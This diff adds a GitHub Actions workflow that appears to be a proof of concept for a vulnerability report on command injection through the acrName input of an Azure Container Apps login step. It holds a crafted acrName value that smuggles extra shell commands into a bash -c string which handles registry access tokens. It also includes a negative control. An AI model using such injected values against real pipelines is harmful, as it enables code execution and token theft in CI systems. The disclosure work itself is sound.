@@ -1,0 +1,82 @@
+name: MSRC Container Apps acrName Mirror Proof
+
+on:
+  push:
+    paths:
+      - '.github/workflows/msrc-container-apps-acrname-mirror-proof.yml'
+
+permissions:
+  contents: read
+
+jobs:
+  acrname-proof:
+    name: Container Apps acrName mirror proof
+    runs-on: ubuntu-latest
+    steps:
+      - name: Mirror source input
+        run: |
+          echo 'source_input=acrName'
+          echo 'sink=bash -c script body in loginAcrWithAccessTokenAsync'
+          echo 'mock_after_azure_login=true'
+
+      - name: Pre-login guard
+        run: |
+          if [ -f "$RUNNER_TEMP/acrname-rce" ]; then
+            echo 'pre_login_marker_exists=true'
+            exit 1
+          else
+            echo 'pre_login_marker_exists=false'
+          fi
+
+      - name: Mock Azure login phase
+        run: |
+          echo 'mock_azure_login_done=true' > "$RUNNER_TEMP/mock_azure_login_done"
+          echo 'mock_azure_login_done=true'
+
+      - name: Execute mirrored vulnerable acrName command string
+        run: |
+          acrName='validacr; echo poc_marker=container_apps_acrname_payload_ran > $RUNNER_TEMP/acrname-rce; if [ -f $RUNNER_TEMP/mock_azure_login_done ]; then echo mock_azure_login_seen_by_payload=true >> $RUNNER_TEMP/acrname-rce; fi; echo validacr'
+          echo "acrName_payload=$acrName"
+          bash -c "CA_ADO_TASK_ACR_ACCESS_TOKEN=\$(az acr login --name $acrName --output json --expose-token --only-show-errors | jq -r '.accessToken'); docker login $acrName.azurecr.io -u 00000000-0000-0000-0000-000000000000 -p \$CA_ADO_TASK_ACR_ACCESS_TOKEN > /dev/null 2>&1" || true
+          if [ -f "$RUNNER_TEMP/acrname-rce" ]; then
+            echo 'post_payload_marker_exists=true'
+            cat "$RUNNER_TEMP/acrname-rce"
+          else
+            echo 'post_payload_marker_exists=false'
+            exit 1
+          fi
+
+      - name: Negative control safe acrName
+        run: |
+          rm -f "$RUNNER_TEMP/acrname-rce-negative"
+          safeAcrName='validacr'
+          bash -c "CA_ADO_TASK_ACR_ACCESS_TOKEN=\$(az acr login --name $safeAcrName --output json --expose-token --only-show-errors | jq -r '.accessToken'); docker login $safeAcrName.azurecr.io -u 00000000-0000-0000-0000-000000000000 -p \$CA_ADO_TASK_ACR_ACCESS_TOKEN > /dev/null 2>&1" || true
+          if [ -f "$RUNNER_TEMP/acrname-rce-negative" ]; then
+            echo 'negative_marker_exists=true'
+            exit 1
+          else
+            echo 'negative_marker_exists=false'
+          fi
+
+      - name: Prepare evidence artifact
+        run: |
+          mkdir -p live-proof-output
+          {
+            echo "run_url=https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}"
+            echo "event_name=${{ github.event_name }}"
+            echo "source_input=acrName"
+            echo "sink=bash -c script body in loginAcrWithAccessTokenAsync"
+            echo "pre_login_marker_exists=false"
+            echo "mock_azure_login_done=true"
+            echo "post_payload_marker_exists=true"
+            echo "negative_marker_exists=false"
+            echo "payload=validacr; echo poc_marker=container_apps_acrname_payload_ran > RUNNER_TEMP/acrname-rce; if [ -f RUNNER_TEMP/mock_azure_login_done ]; then echo mock_azure_login_seen_by_payload=true >> RUNNER_TEMP/acrname-rce; fi; echo validacr"
+          } > live-proof-output/owned-mirror-live-proof-summary.txt
+          cp "$RUNNER_TEMP/acrname-rce" live-proof-output/acrname-marker.txt
+          cp .github/workflows/msrc-container-apps-acrname-mirror-proof.yml live-proof-output/base-workflow.yml
+
+      - name: Upload evidence artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: container-apps-acrname-owned-mirror-live-proof
+          path: live-proof-output
